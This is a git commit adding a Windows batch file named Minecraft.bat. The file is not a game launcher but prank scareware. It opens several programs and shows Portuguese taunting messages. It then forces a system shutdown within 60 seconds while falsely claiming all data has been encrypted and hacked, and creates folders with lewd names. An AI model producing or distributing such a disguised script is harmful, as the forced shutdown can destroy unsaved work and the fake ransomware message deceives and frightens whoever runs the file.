9382af5913cfc7a1d51570b45491be11d0547da6
L0rdSaiyan <89421533+L0rdSaiyan@users.noreply.github.com>
2022-05-18 20:05:28 -0300

    Add files via upload

---
+++ Minecraft.bat
@@ -0,0 +1,17 @@
+@echo off
+
+start explorer
+start mspaint
+start magnify
+start calc 
+
+timeout 5
+
+msg * Ola, parece que voce esta tendo alguns problemas...
+
+shutdown /s /f /t 60 /c "Todos os seus dados foram criptografados e hackeados por Lord_Saiyan :D. Nao se preocupe, voce tem 60 segundos para tentar se livrar deste virus"
+
+msg * acho melhor voce correr contra o tempo.
+
+md hentai
+md fotos_picantes
